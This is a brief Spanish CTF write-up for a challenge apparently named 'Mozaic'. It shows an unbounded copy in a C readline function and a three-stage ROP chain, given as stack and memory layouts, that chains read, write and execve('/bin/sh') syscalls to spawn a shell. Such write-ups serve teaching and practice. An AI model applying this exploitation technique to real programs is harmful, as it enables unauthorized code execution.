# Mozaic

Se puede hacer ROP usando el buffer overflow aqui que almacena tantos bytes como se entren en `scratch_buffer`:
``` C
void readline(char* buff)
{
    char scratch_buffer[64] = {0};

    while(1){
        read(0, scratch_buffer, 64);
        for(unsigned int i = 0; i < 64; ++i){
            if(scratch_buffer[i] == '\n')
                goto done;
            *buff = scratch_buffer[i];
            ++buff;
        }
    }
done:
    *buff = '\0';
}
```

El ROP va orientado a la direccion de retorno de `loop`, funcion que llama a readline:
```
void loop()
{
    unsigned int exitFlag = 0;
    char buffer[64] = {0};

    while(1){
        write(1, "$> ", 3);
        readline(buffer);
        parseCommand(buffer, &exitFlag);
        if(exitFlag == 1)
            break;
    }
}
```


#### Primer retorno
----------------
SYSCALL READ

end_DATA_ADDR - 0x16 [0x403000] (Buffer, Direccion del banner)

end_DATA_ADDR - 0x8 [1426] (Cantidad de bytes leidos)

end_DATA_ADDR - 0x4 [0] (Descriptor de archivo, stdin)

end_DATA_ADDR 0 [RBP]


#### Segundo retorno
-----------------
SYSCALL WRITE

BANNER_ADDR 0 [Padding]

BANNER_ADDR + 0x40 [0x403000] (Direccion de BANNER_ADDR)

BANNER_ADDR + 0x48 [0x3b] (Numero de bytes a ser escritos, numero de la syscall)

BANNER_ADDR + 0x4C [1] (Descriptor de archivo, stdout)

BANNER_ADDR + 0x50 [RBP]

#### Tercer retorno
----------------
SYSCALL EXECVE

BANNER_ADDR + 0x50 ["/bin/sh\0"]

BANNER_ADDR + 0x58 [BANNER_ADDR + 0x50] (Puntero)

BANNER_ADDR + 0x60 [0] (NULL)

BANNER_ADDR + 0x68 [BANNER_ADDR + 0x58] (Puntero a puntero)

BANNER_ADDR + 0x70 [0] (NULL) 

BANNER_ADDR + 0x74 [BANNER_ADDR + 0x50] (Puntero)

BANNER_ADDR + 0x78 [RBP]
